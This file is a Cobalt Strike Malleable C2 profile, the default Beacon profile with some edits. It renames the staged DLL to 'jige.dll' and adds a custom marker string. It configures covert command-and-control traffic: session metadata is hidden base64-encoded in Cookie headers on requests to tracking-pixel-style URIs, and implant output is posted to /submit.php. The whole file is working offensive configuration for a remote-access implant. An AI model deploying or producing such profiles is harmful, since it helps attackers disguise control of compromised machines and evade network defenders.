# default sleep time is 60s
set sleeptime "60000";

# jitter factor 0-99% [randomize callback times]
set jitter    "0";

# maximum number of bytes to send in a DNS A record request
set maxdns    "255";

# indicate that this is the default Beacon profile
set sample_name "Cobalt Strike Beacon (Default)";

# this is the default profile. Make sure we look like Cobalt Strike's Beacon payload. (that's what we are, right?)
stage {
	set stomppe "false";
	set name    "jige.dll";

	string "kuailejige";
	string "HTTP/1.1 200 OK";
	string "Content-Type: application/octet-stream";
	string "Content-Length: %d";
	string "Microsoft Base Cryptographic Provider v1.0";
}

# define indicators for an HTTP GET
http-get {
	# Beacon will randomly choose from this pool of URIs
	set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";

	client {
		# base64 encode session metadata and store it in the Cookie header.
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		# server should send output with no changes
		header "Content-Type" "application/octet-stream";

		output {
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
	set uri "/submit.php";

	client {
		header "Content-Type" "application/octet-stream";

		# transmit our session identifier as /submit.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "text/html";

		# this will just print an empty string, meh...
		output {
			print;
		}
	}
}
